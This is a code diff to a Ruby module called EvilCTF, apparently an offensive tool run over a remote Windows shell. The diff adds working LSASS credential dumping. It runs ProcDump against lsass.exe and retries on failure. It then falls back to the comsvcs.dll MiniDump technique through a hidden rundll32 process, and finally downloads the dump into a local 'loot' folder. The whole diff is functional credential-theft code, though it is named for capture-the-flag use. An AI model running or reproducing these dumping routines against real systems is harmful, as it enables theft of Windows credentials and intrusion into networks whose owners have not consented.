@@ -184,9 +184,92 @@ module EvilCTF
         EvilCTF::Tools.safe_autostage('procdump', shell, session_options, logger)
         command_manager = session_options[:command_manager]
         command_manager.expand_macro('lsass_dump', shell, webhook: session_options[:webhook])
-        EvilCTF::Uploader.download_file('C:\\Users\\Public\\lsass.dmp',
-                                         "loot/lsass_#{session_options[:ip]}.dmp",
-                                         shell)
+
+        locate_ps = <<~PS
+          try {
+            $files = Get-ChildItem -LiteralPath 'C:\\Users\\Public' -File -ErrorAction SilentlyContinue |
+              Where-Object { $_.Name -like 'lsass*.dmp*' } |
+              Sort-Object LastWriteTime -Descending
+            if ($files -and $files.Count -gt 0) {
+              "FOUND::" + $files[0].FullName
+            } else {
+              "MISSING"
+            }
+          } catch {
+            "ERROR::" + $_.Exception.Message
+          }
+        PS
+
+        resolve_dump_path = lambda do
+          locate_res = shell.run(locate_ps)
+          locate_out = locate_res&.output.to_s
+          found_line = locate_out.lines.map(&:strip).find { |ln| ln.start_with?('FOUND::') }
+          dump_path = found_line ? found_line.sub('FOUND::', '').strip : nil
+          [dump_path, locate_out]
+        end
+
+        dump_path, locate_out = resolve_dump_path.call
+
+        unless dump_path
+          puts '[*] No dump from initial macro run; retrying ProcDump with explicit diagnostics...'
+          procdump_retry_ps = <<~PS
+            try {
+              $exe = 'C:\\Users\\Public\\procdump64.exe'
+              if (!(Test-Path -LiteralPath $exe)) {
+                "RETRY_ERROR::ProcDump not found at $exe"
+              } else {
+                $target = 'C:\\Users\\Public\\lsass_retry.dmp'
+                & $exe -accepteula -ma lsass.exe $target 2>&1 | ForEach-Object { $_.ToString() }
+                "RETRY_EXIT::$LASTEXITCODE"
+              }
+            } catch {
+              "RETRY_ERROR::" + $_.Exception.Message
+            }
+          PS
+          retry_res = shell.run(procdump_retry_ps)
+          retry_out = retry_res&.output.to_s
+          retry_out.lines.each { |ln| puts "[procdump] #{ln.strip}" unless ln.to_s.strip.empty? }
+          if retry_out.include?('RETRY_EXIT::-1073741515')
+            puts '[!] ProcDump failed with STATUS_DLL_NOT_FOUND (-1073741515). Target likely lacks required runtime/DLL dependencies for this binary.'
+          end
+
+          dump_path, locate_out = resolve_dump_path.call
+        end
+
+        unless dump_path
+          puts '[*] ProcDump still did not produce a file; attempting comsvcs MiniDump fallback...'
+          comsvcs_ps = <<~PS
+            try {
+              $lsass = Get-Process -Name lsass -ErrorAction Stop | Select-Object -First 1
+              $lsassPid = $lsass.Id
+              $out = 'C:\\Users\\Public\\lsass_comsvcs.dmp'
+              $args = "C:\\Windows\\System32\\comsvcs.dll, MiniDump $lsassPid $out full"
+              $p = Start-Process -FilePath 'rundll32.exe' -ArgumentList $args -PassThru -Wait -WindowStyle Hidden
+              "COMSVCS_EXIT::$($p.ExitCode)"
+            } catch {
+              "COMSVCS_ERROR::" + $_.Exception.Message
+            }
+          PS
+          comsvcs_res = shell.run(comsvcs_ps)
+          comsvcs_out = comsvcs_res&.output.to_s
+          comsvcs_out.lines.each { |ln| puts "[comsvcs] #{ln.strip}" unless ln.to_s.strip.empty? }
+
+          dump_path, locate_out = resolve_dump_path.call
+        end
+
+        if dump_path
+          EvilCTF::Uploader.download_file(
+            dump_path,
+            "loot/lsass_#{session_options[:ip]}.dmp",
+            shell
+          )
+        else
+          puts '[!] No LSASS dump file found in C:\\Users\\Public after procdump execution.'
+          if locate_out.include?('ERROR::')
+            puts "[!] Dump discovery error: #{locate_out.lines.map(&:strip).find { |ln| ln.start_with?('ERROR::') }}"
+          end
+          puts '[!] Current user likely lacks required LSASS access (admin + SeDebug and no PPL/Credential Guard constraints).'
+        end
         ''
       end
 
